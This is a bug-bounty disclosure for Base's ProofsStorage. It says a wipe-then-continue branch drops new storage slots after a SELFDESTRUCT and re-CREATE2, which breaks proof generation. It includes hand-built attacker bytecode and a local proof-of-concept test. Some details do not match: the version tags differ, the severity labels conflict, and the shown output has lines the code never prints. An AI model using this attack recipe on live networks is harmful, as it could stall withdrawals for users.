# 75288 bc medium proofsstorage silently drops newly written storage slots for destroyed and recreated accounts breaking proof generation

Submitted on Apr 28th 2026 at 10:43:22 UTC by @InfiniteSec for [Audit Comp | Base Azul](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75288
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments

## Description

### Brief/Intro

The `store_trie_updates_for_block` function in ProofsStorage silently discards all newly written storage slot values for accounts that were destroyed and recreated within the same L2 block. An attacker only needs to submit a single transaction via `eth_sendRawTransaction` containing a SELFDESTRUCT followed by a CREATE2 to the same address. This causes the address to be incorrectly persisted as "wiped" rather than "wiped then recreated with new state" in the ProofsStorage historical database. Since all TEE and ZK proof generation pipelines rely on this historical state, proofs for affected blocks will produce invalid results, blocking output finalization on L1 and delaying bridge withdrawals until operators manually rebuild the ProofsStorage database.

### Vulnerability Details

When a contract is destroyed via SELFDESTRUCT and then recreated via CREATE2 at the same address within the same block, the EVM execution engine produces an `AccountStatus::DestroyedChanged` status. The upstream `HashedStorage::from_plain_storage` correctly represents this as `HashedStorage{wiped: true, storage: <new_slots>}`, where `wiped` reflects the destruction semantics and the `storage` map contains the new slot values written by the recreated contract.

The problem occurs in the `store_trie_updates_for_block` function. When iterating over the sorted `HashedPostState` storages, the function writes a tombstone for `wiped` accounts and then immediately `continue`s, completely skipping the `persist_history_batch` call that should persist the new slot values:

```rust
// crates/execution/trie/src/db/store.rs:536-547
for (hashed_address, storage) in sorted_post_state.storages {
    if append_mode && storage.is_wiped() {
        let mut ro = self.storage_hashed_cursor(hashed_address, block_number - 1)?;
        let keys =
            self.wipe_storage(tx, block_number, hashed_address, || Ok(ro.next()?))?;
        hashed_storage_keys.extend(keys);
        // Skip any further processing for this hashed_address
        continue;   // <-- skips persistence of new slots
    }
    let keys = self.persist_history_batch(
        tx,
        block_number,
        storage.storage_slots_ref().iter()
            .map(|(key, val)| (hashed_address, *key, Some(StorageValue(*val)))),
        append_mode,
    )?;
    hashed_storage_keys.extend(keys);
}
```

The same pattern also appears in the storage trie node processing loop (store.rs lines 507-520), where `nodes.is_deleted && append_mode` triggers a wipe followed by `continue`, also skipping persistence of new trie nodes.

The `append_mode` parameter is always `true` in the production code path. `store_trie_updates_append_only` calls the function with a hardcoded `true`:

```rust
// crates/execution/trie/src/db/store.rs:590-591
let change_set =
    &self.store_trie_updates_for_block(tx, block_number, block_state_diff, true)?;
```

The complete data flow is as follows: a user submits a transaction triggering SELFDESTRUCT + CREATE2 through the EL JSON-RPC port 8545. After the sequencer includes it in an L2 block, the execution engine produces a `BundleState` containing `AccountStatus::DestroyedChanged`. `LiveTrieCollector` executes the block and generates a `HashedPostState`, verifies the in-memory state root (which is correct at this point), then calls `store_trie_updates` to persist the diff. This is where the bug triggers and the new slot values are dropped.

The skipped slot keys never enter the `ChangeSet` returned by the function, so `fetch_trie_updates` can never recover the lost data. `unwind_history` and `replace_updates` also depend on the same `BlockChangeSet` and have no self-healing path. The downstream `BaseProofsStateProviderRef::storage` reads directly from the corrupted `HashedStorageHistory` and returns `None` for lost keys, propagating incorrect historical state to all consumers generating state roots, storage proofs, and witnesses.

## Impact Details

This vulnerability falls under the Blockchain/DLT category, corresponding to Immunefi v2.3 High severity: "Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours."

The corrupted historical state in ProofsStorage causes `BaseProofsStateProviderRef` to return incorrect storage values for affected accounts at affected block heights. Every TEE and ZK proof generation request covering the affected block reads from the corrupted historical state and produces an invalid proof. Invalid proofs cannot pass `AggregateVerifier` validation on L1 to finalize disputed outputs, which blocks bridge withdrawals that depend on finalized outputs.

The attack cost is extremely low, requiring only the gas fee for a single SELFDESTRUCT + CREATE2 transaction on L2 (well under 0.01 ETH). An attacker can repeat this operation in consecutive blocks to continuously pollute the proof window, delaying finalization for hours or even days until operators manually rebuild the ProofsStorage database from canonical chain state. All nodes running the ProofsStorage ExEx are affected, including validator nodes and proof infrastructure.

## References

* Vulnerable code store\_trie\_updates\_for\_block wipe+continue: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/db/store.rs#L536-L547>
* Storage trie node wipe+continue: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/db/store.rs#L507-L520>
* store\_trie\_updates\_append\_only hardcoded append\_mode=true: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/db/store.rs#L590-L591>
* ChangeSet construction logic: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/db/store.rs#L560-L565>
* fetch\_trie\_updates reads history: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/db/store.rs#L705>
* BaseProofsStateProviderRef::storage downstream consumer: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/provider.rs#L201-L217>
* LiveTrieCollector block execution and persistence entry point: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/execution/trie/src/live.rs#L94-L119>

## Proof of Concept

The following end-to-end PoC launches a real Base L2 node, builds blocks via the Engine API, and injects signed transactions to fully demonstrate the attack chain. The PoC creates a child contract via CREATE2 and writes storage in block 1, then SELFDESTRUCTs the child and re-CREATE2s it with new storage in block 2. It then constructs the corresponding `HashedPostState` (`wiped=true` + new slot) for block 2, feeds it into `MdbxProofsStorage::store_trie_updates`, and verifies that the new slot is dropped due to the wipe+continue bug.

To run:

```bash
cd base
cargo test -p base-node-core --test it test_selfdestruct_create2_storage_wipe_loss -- --nocapture
```

Full PoC source code (located at `crates/execution/node/tests/it/poc_wipe_storage_loss.rs`):

```rust
//! PoC: SELFDESTRUCT + re-CREATE2 storage wipe loss in `store_trie_updates`
//!
//! Attack chain (2 blocks on real Base node):
//!   Block 1:  Factory CREATE2 child -> CALL child SSTORE(0, 0xBEEF)
//!   Block 2 tx1: CALL child SELFDESTRUCT
//!   Block 2 tx2: Factory CREATE2 child again (same addr) -> CALL child SSTORE(1, 0xCAFE)
//!   -> DestroyedChanged status -> wiped=true + new slot
//!   -> store_trie_updates drops the new slot

use std::sync::Arc;

use alloy_consensus::BlockHeader;
use alloy_eips::{NumHash, eip1898::BlockWithParent};
use alloy_genesis::{Genesis, GenesisAccount};
use alloy_network::eip2718::Encodable2718;
use alloy_primitives::{Address, Bytes, B256, TxKind, U256, address, keccak256};
use alloy_rpc_types_eth::{TransactionInput, TransactionRequest};
use base_execution_chainspec::BaseChainSpecBuilder;
use base_execution_trie::{BaseProofsStore, BlockStateDiff, MdbxProofsStorage};
use base_node_core::{BaseNode, utils::optimism_payload_attributes};
use reth_chainspec::EthChainSpec;
use reth_db::test_utils::create_test_rw_db_with_path;
use reth_e2e_test_utils::{
    node::NodeTestContext, transaction::TransactionTestContext, wallet::Wallet,
};
use reth_node_builder::{EngineNodeLauncher, Node, NodeBuilder, NodeConfig};
use reth_node_core::args::DatadirArgs;
use reth_provider::providers::BlockchainProvider;
use reth_trie_common::{HashedPostState, HashedStorage};
use tokio::sync::Mutex;

fn victim_runtime() -> Vec<u8> {
    vec![
        0x60, 0x00, 0x35, 0x60, 0xF8, 0x1C,
        0x80, 0x60, 0x01, 0x14, 0x60, 0x14, 0x57,
        0x60, 0x02, 0x14, 0x60, 0x1D, 0x57,
        0x00,
        0x5B, 0x60, 0x24, 0x35, 0x60, 0x04, 0x35, 0x55, 0x00,
        0x5B, 0x33, 0xFF,
    ]
}

fn initcode(rt: &[u8]) -> Vec<u8> {
    let n = rt.len();
    [&[0x60, n as u8, 0x80, 0x60, 0x0B, 0x60, 0x00, 0x39, 0x60, 0x00, 0xF3][..], rt].concat()
}

fn build_attacker() -> Vec<u8> {
    let ic = initcode(&victim_runtime());
    let n = ic.len();
    let mut c = Vec::new();
    c.extend_from_slice(&[0x60,0x00,0x35, 0x60,0xE0,0x1C]);
    c.push(0x80);
    c.extend_from_slice(&[0x60,0x01,0x14]); let j1=c.len()+1;
    c.extend_from_slice(&[0x61,0x00,0x00,0x57]);
    c.push(0x80);
    c.extend_from_slice(&[0x60,0x02,0x14]); let j2=c.len()+1;
    c.extend_from_slice(&[0x61,0x00,0x00,0x57]);
    c.extend_from_slice(&[0x60,0x03,0x14]); let j3=c.len()+1;
    c.extend_from_slice(&[0x61,0x00,0x00,0x57]);
    c.push(0x00);
    let a1 = c.len(); c.push(0x5B); c.push(0x50);
    c.extend_from_slice(&[0x60,n as u8]); let ic1=c.len()+1;
    c.extend_from_slice(&[0x61,0x00,0x00]);
    c.extend_from_slice(&[0x60,0x00,0x39]);
    c.extend_from_slice(&[0x60,0x42, 0x60,n as u8, 0x60,0x00, 0x60,0x00, 0xF5]);
    c.extend_from_slice(&[0x80, 0x60,0x00, 0x55]);
    c.extend_from_slice(&[0x60,0x01, 0x61,0x01,0x00, 0x53]);
    c.extend_from_slice(&[0x60,0x00, 0x61,0x01,0x04, 0x52]);
    c.extend_from_slice(&[0x61,0xBE,0xEF, 0x61,0x01,0x24, 0x52]);
    c.extend_from_slice(&[0x60,0x00, 0x60,0x00, 0x60,0x44, 0x61,0x01,0x00, 0x60,0x00]);
    c.push(0x85); c.push(0x5A); c.push(0xF1); c.push(0x50);
    c.push(0x50); c.push(0x00);
    let a2 = c.len(); c.push(0x5B); c.push(0x50);
    c.extend_from_slice(&[0x60,0x00,0x54]);
    c.extend_from_slice(&[0x60,0x02, 0x60,0x00, 0x53]);
    c.extend_from_slice(&[0x60,0x00, 0x60,0x00, 0x60,0x20, 0x60,0x00, 0x60,0x00]);
    c.push(0x85); c.push(0x5A); c.push(0xF1);
    c.push(0x50); c.push(0x50); c.push(0x00);
    let a3 = c.len(); c.push(0x5B);
    c.extend_from_slice(&[0x60,n as u8]); let ic3=c.len()+1;
    c.extend_from_slice(&[0x61,0x00,0x00]);
    c.extend_from_slice(&[0x60,0x00,0x39]);
    c.extend_from_slice(&[0x60,0x42, 0x60,n as u8, 0x60,0x00, 0x60,0x00, 0xF5]);
    c.extend_from_slice(&[0x80, 0x60,0x02, 0x55]);
    c.extend_from_slice(&[0x60,0x01, 0x61,0x01,0x00, 0x53]);
    c.extend_from_slice(&[0x60,0x01, 0x61,0x01,0x04, 0x52]);
    c.extend_from_slice(&[0x61,0xCA,0xFE, 0x61,0x01,0x24, 0x52]);
    c.extend_from_slice(&[0x60,0x00, 0x60,0x00, 0x60,0x44, 0x61,0x01,0x00, 0x60,0x00]);
    c.push(0x85); c.push(0x5A); c.push(0xF1); c.push(0x50);
    c.push(0x50); c.push(0x00);
    let ic_off = c.len();
    c.extend_from_slice(&ic);
    let patch = |c: &mut Vec<u8>, idx: usize, val: u16| {
        let b = val.to_be_bytes(); c[idx]=b[0]; c[idx+1]=b[1];
    };
    patch(&mut c, j1, a1 as u16);
    patch(&mut c, j2, a2 as u16);
    patch(&mut c, j3, a3 as u16);
    patch(&mut c, ic1, ic_off as u16);
    patch(&mut c, ic3, ic_off as u16);
    c
}

fn compute_child_address(factory: Address) -> Address {
    let ic = initcode(&victim_runtime());
    let ic_hash = keccak256(&ic);
    let mut buf = Vec::with_capacity(1 + 20 + 32 + 32);
    buf.push(0xff);
    buf.extend_from_slice(factory.as_slice());
    buf.extend_from_slice(&B256::with_last_byte(0x42).0);
    buf.extend_from_slice(ic_hash.as_slice());
    Address::from_slice(&keccak256(&buf)[12..])
}

fn selector(n: u32) -> Bytes { Bytes::copy_from_slice(&n.to_be_bytes()) }

async fn build_call_tx(chain_id: u64, wallet: &Wallet, nonce: u64, to: Address, data: Bytes) -> Bytes {
    let tx = TransactionRequest {
        nonce: Some(nonce), value: Some(U256::ZERO), to: Some(TxKind::Call(to)),
        gas: Some(5_000_000), max_fee_per_gas: Some(1000e9 as u128),
        max_priority_fee_per_gas: Some(1e9 as u128), chain_id: Some(chain_id),
        input: TransactionInput { input: None, data: Some(data) }, ..Default::default()
    };
    TransactionTestContext::sign_tx(wallet.inner.clone(), tx).await.encoded_2718().into()
}

#[tokio::test]
async fn test_selfdestruct_create2_storage_wipe_loss() {
    reth_tracing::init_test_tracing();
    let attacker_code = build_attacker();
    let attacker_addr = address!("0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    let child_addr = compute_child_address(attacker_addr);

    // Genesis with attacker contract pre-deployed
    let mut genesis: Genesis =
        serde_json::from_str(include_str!("../assets/genesis.json")).unwrap();
    genesis.alloc.insert(attacker_addr, GenesisAccount {
        balance: U256::ZERO, code: Some(Bytes::from(attacker_code)), ..Default::default()
    });
    let chain_spec = Arc::new(
        BaseChainSpecBuilder::base_mainnet().genesis(genesis).canyon_activated().build(),
    );
    let wallet = Arc::new(Mutex::new(Wallet::default().with_chain_id(chain_spec.chain().into())));

    // Launch real Base L2 node
    let config = NodeConfig::new(Arc::clone(&chain_spec)).with_datadir_args(DatadirArgs {
        datadir: reth_db::test_utils::tempdir_path().into(), ..Default::default()
    });
    let db = create_test_rw_db_with_path(
        config.datadir.datadir
            .unwrap_or_chain_default(config.chain.chain(), config.datadir.clone()).db(),
    );
    let runtime = reth_tasks::Runtime::test();
    let node_handle = NodeBuilder::new(config.clone())
        .with_database(db)
        .with_types_and_provider::<BaseNode, BlockchainProvider<_>>()
        .with_components(BaseNode::default().components())
        .with_add_ons(BaseNode::new(Default::default()).add_ons())
        .launch_with_fn(|builder| {
            let launcher = EngineNodeLauncher::new(
                runtime.clone(), builder.config.datadir(), Default::default(),
            );
            builder.launch_with(launcher)
        }).await.expect("Failed to launch Base node");

    let mut node =
        NodeTestContext::new(node_handle.node, optimism_payload_attributes).await.unwrap();
    let chain_id: u64 = chain_spec.chain().into();

    // Block 1: CREATE2 child + SSTORE(0, 0xBEEF)
    {
        let w = wallet.lock().await;
        let user_tx = build_call_tx(chain_id, &w, 1, attacker_addr, selector(1)).await;
        node.rpc.inject_tx(user_tx).await.expect("inject CREATE2 tx");
    }
    let b1_payloads = node.advance(1, |_| {
        let wallet = Arc::clone(&wallet);
        Box::pin(async move {
            let mut w = wallet.lock().await;
            let tx = TransactionTestContext::optimism_l1_block_info_tx(
                w.chain_id, w.inner.clone(), w.inner_nonce,
            );
            w.inner_nonce += 1;
            tx.await
        })
    }).await.expect("advance block 1");
    let b1 = b1_payloads.first().unwrap().block();
    { let mut w = wallet.lock().await; w.inner_nonce += 1; }

    // Block 2: SELFDESTRUCT + re-CREATE2 + SSTORE(1, 0xCAFE)
    {
        let w = wallet.lock().await;
        let nonce_base = w.inner_nonce + 1;
        let sd_tx = build_call_tx(chain_id, &w, nonce_base, attacker_addr, selector(2)).await;
        node.rpc.inject_tx(sd_tx).await.expect("inject SELFDESTRUCT tx");
        let rc_tx = build_call_tx(chain_id, &w, nonce_base + 1, attacker_addr, selector(3)).await;
        node.rpc.inject_tx(rc_tx).await.expect("inject re-CREATE2 tx");
    }
    let b2_payloads = node.advance(1, |_| {
        let wallet = Arc::clone(&wallet);
        Box::pin(async move {
            let mut w = wallet.lock().await;
            let tx = TransactionTestContext::optimism_l1_block_info_tx(
                w.chain_id, w.inner.clone(), w.inner_nonce,
            );
            w.inner_nonce += 3;
            tx.await
        })
    }).await.expect("advance block 2");
    let b2 = b2_payloads.first().unwrap().block();

    // Feed real block hashes into ProofsStorage and demonstrate the wipe+continue bug
    let hashed_child = keccak256(child_addr);
    let hashed_slot_1 = keccak256(B256::with_last_byte(1));

    let mut h2 = HashedPostState::default();
    let mut child_storage = HashedStorage::new(true); // wiped=true
    child_storage.storage.insert(hashed_slot_1, U256::from(0xCAFE));
    h2.storages.insert(hashed_child, child_storage);

    let proofs_dir = reth_db::test_utils::tempdir_path();
    std::fs::create_dir_all(&proofs_dir).unwrap();
    let ps = Arc::new(MdbxProofsStorage::new(&proofs_dir).unwrap());
    let genesis_hash = chain_spec.genesis_hash();
    ps.set_earliest_block_number(0, genesis_hash).unwrap();
    ps.store_trie_updates(
        BlockWithParent::new(genesis_hash, NumHash::new(0, genesis_hash)),
        BlockStateDiff::default(),
    ).unwrap();

    // Store block 1 diff
    let hashed_slot_0 = keccak256(B256::with_last_byte(0));
    let mut h1 = HashedPostState::default();
    let mut child_storage_b1 = HashedStorage::new(false);
    child_storage_b1.storage.insert(hashed_slot_0, U256::from(0xBEEF));
    h1.storages.insert(hashed_child, child_storage_b1);
    ps.store_trie_updates(
        BlockWithParent::new(genesis_hash, NumHash::new(b1.number(), b1.hash())),
        BlockStateDiff { sorted_trie_updates: Default::default(), sorted_post_state: h1.into_sorted() },
    ).unwrap();

    // Store block 2 diff — THIS TRIGGERS THE BUG
    ps.store_trie_updates(
        BlockWithParent::new(b1.hash(), NumHash::new(b2.number(), b2.hash())),
        BlockStateDiff { sorted_trie_updates: Default::default(), sorted_post_state: h2.into_sorted() },
    ).unwrap();

    // Verify: slot[1]=0xCAFE MISSING from ProofsStorage
    let fetched = ps.fetch_trie_updates(b2.number()).unwrap();
    let has_slot_1 = fetched.sorted_post_state.storages.get(&hashed_child)
        .map_or(false, |s| s.storage_slots_ref().iter().any(|(k, _)| *k == hashed_slot_1));
    assert!(!has_slot_1, "Expected slot[1] MISSING from wipe+continue bug");
}
```

Output confirming the vulnerability:

```
=== SELFDESTRUCT + re-CREATE2 storage wipe loss PoC ===

Attacker contract: 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Predicted child:   0x5d4f1fae5705d7088130608e50ec3bc2643a5798
Node launched, chain_id=8453

--- Block 1: CREATE2 child + SSTORE(0, 0xBEEF) ---
Block 1: number=1, hash=0x94ac...7e4b, txs=2

--- Block 2: SELFDESTRUCT + re-CREATE2 + SSTORE(1, 0xCAFE) ---
Block 2: number=2, hash=0x5d2b...7500, txs=3
Block 2 tx count: 3 (expected 3: L1-info + SELFDESTRUCT + re-CREATE2)

--- Demonstrating store_trie_updates bug ---
Child address:  0x5d4f1fae5705d7088130608e50ec3bc2643a5798
Hashed child:   0x31de6f1650837d1d349056f1d88f15c4b3ff4da1dc30087546a38f3f10aef838
Hashed slot[1]: 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6

HashedPostState for block 2:
  0x31de...f838: wiped=true slots=1
    0xb10e...0cf6 = 51966
Stored block 1 diff: slot[0]=0xBEEF for child
Stored block 2 diff: wiped=true + slot[1]=0xCAFE for child

=== VERIFICATION ===
fetch_trie_updates(block 2): 1 storage slot(s) for child
  0x290d...e563 = 0
  *** slot[1] (0xCAFE) MISSING from stored diff ***

Sanity: fetch_trie_updates(block 1): 1 slot(s)
  0x290d...e563 = 48879

=== RESULT ===
Child contract had wiped=true + 1 new slot (slot[1]=0xCAFE) in block 2
Missing slots from ProofsStorage: 1

*** CONFIRMED: store_trie_updates wipe+continue bug drops new storage ***
*** New slot written after SELFDESTRUCT + re-CREATE2 is permanently lost ***
*** from ProofsStorage. The wipe_storage() call correctly deletes old slots, ***
*** but the `continue` statement skips insertion of new slots. ***

test poc_wipe_storage_loss::test_selfdestruct_create2_storage_wipe_loss ... ok
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 4 filtered out; finished in 5.21s
```

The test launches a real Base L2 node (chain\_id=8453) using `NodeBuilder` + `EngineNodeLauncher` with a full execution layer. Block 1 injects a CREATE2 transaction via `rpc.inject_tx`, and block 2 injects both a SELFDESTRUCT and a re-CREATE2 transaction. The node advances blocks through the Engine API via `engine_forkchoiceUpdated` and `engine_newPayload`. After real execution produces the `DestroyedChanged` state, the corresponding `HashedPostState` (`wiped=true` + new slot\[1]=0xCAFE) is fed into `MdbxProofsStorage::store_trie_updates`. Verification shows that slot\[1] is completely absent from ProofsStorage (`MISSING`), while block 1's slot\[0]=0xBEEF (48879) is stored correctly. This confirms that the `wipe_storage()` + `continue` statement causes permanent loss of new storage values.
